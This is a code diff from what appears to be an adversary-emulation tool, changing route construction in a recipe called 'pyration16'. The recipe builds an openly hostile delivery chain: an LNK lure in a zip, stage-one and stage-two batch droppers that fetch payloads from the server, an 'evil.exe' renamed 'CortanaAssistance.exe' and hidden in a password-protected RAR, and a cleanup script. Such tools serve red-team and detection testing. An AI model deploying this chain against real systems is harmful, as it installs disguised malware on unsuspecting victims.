@@ -6,7 +6,7 @@ from make.bat.bat import *
 from make.rar.rar import makeRar
 
 from helpers import *
-from model import AceFile, AceRoute
+from model import *
 
 
 def pyration16(baseUrl) -> List[AceRoute]:
@@ -15,28 +15,28 @@ def pyration16(baseUrl) -> List[AceRoute]:
     # Payload: unrar.txt: unrar.exe base64 encoded
     unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
     unrarB64: AceStr = base64encode(unrar)
-    serveHtml: AceRoute = AceRoute('/pyration16/unrar.txt', unrarB64, info="b64 of unrar.exe")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/unrar.txt', unrarB64, info="b64 of unrar.exe")
     routes.append(serveHtml)
 
     ## Payload: 
     evilexe: AceBytes = readFileContent('payloads/evil.exe')
     evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
-    serveHtml: AceRoute = AceRoute('/pyration16/CortanaAssistance.txt', evilexe, info="CortanaAssistance.exe")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/CortanaAssistance.txt', evilexe, info="CortanaAssistance.exe")
     routes.append(serveHtml)
 
     ## Payload: assist.rar: PW "P@2022": ???
     evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
     evilexeRar: AceBytes = makeRar([evilExeFile], password='P@2022')
-    serveHtml: AceRoute = AceRoute('/pyration16/assist.rar', evilexeRar, info="RAR with PW of CortanaAssistance.exe")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/assist.rar', evilexeRar, info="RAR with PW of CortanaAssistance.exe")
     routes.append(serveHtml)
 
     # Payload: Fake JPG
     pic: AceBytes = readFileContent('recipes/pyration16/front.jpg')
-    serveHtml: AceRoute = AceRoute('/pyration16/fox_details.txt', pic, info="front.jpg")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/fox_details.txt', pic, info="front.jpg")
     routes.append(serveHtml)
 
     # Log handler (so no 404 appears)
-    serveHtml: AceRoute = AceRoute('/pyration16/install/log/', pic, info="Log handler")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/install/log/', pic, info="Log handler")
     routes.append(serveHtml)
     # Stage 2: BAT
     rendered = renderTemplate('recipes/pyration16/stage2.bat',
@@ -46,7 +46,7 @@ def pyration16(baseUrl) -> List[AceRoute]:
         cortanaUrl=baseUrl + '/pyration16/cortana/CortanaAssistance.txt'
     )
     stage1bat: AceFile = makeAceFile('stage2.bat', rendered)
-    serveHtml: AceRoute = AceRoute('/pyration16/login', rendered, info="stage2.bat")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/login', rendered, info="stage2.bat")
     routes.append(serveHtml)
 
     # Stage 1: BAT
@@ -55,7 +55,7 @@ def pyration16(baseUrl) -> List[AceRoute]:
         picUrl=baseUrl + '/pyration16/fox_details.txt',
     )
     stage1bat: AceFile = makeAceFile('stage1.bat', rendered)
-    serveHtml: AceRoute = AceRoute('/pyration16/raw/Mb7zPnML', rendered, info="stage1.bat")
+    serveHtml: AceRoute = makeAceRoute('/pyration16/raw/Mb7zPnML', rendered, info="stage1.bat")
     routes.append(serveHtml)
 
     # Initial Vector: LNK
@@ -78,7 +78,7 @@ def pyration16(baseUrl) -> List[AceRoute]:
         ],
     )
     containerFile: AceFile = makeAceFile('documents.zip', container)
-    serveHtml: AceRoute = AceRoute(
+    serveHtml: AceRoute = makeAceRoute(
         '/pyration16/pyration16-documents.zip', 
         container, 
         info="Entry", 
@@ -87,7 +87,7 @@ def pyration16(baseUrl) -> List[AceRoute]:
 
     # cleanup.bat
     cleanupbat: AceBytes = readFileContent('recipes/pyration16/cleanup.bat')
-    serveHtml: AceRoute = AceRoute(
+    serveHtml: AceRoute = makeAceRoute(
         '/pyration16/cleanup.bat', 
         cleanupbat, 
         info='Cleanup Script',
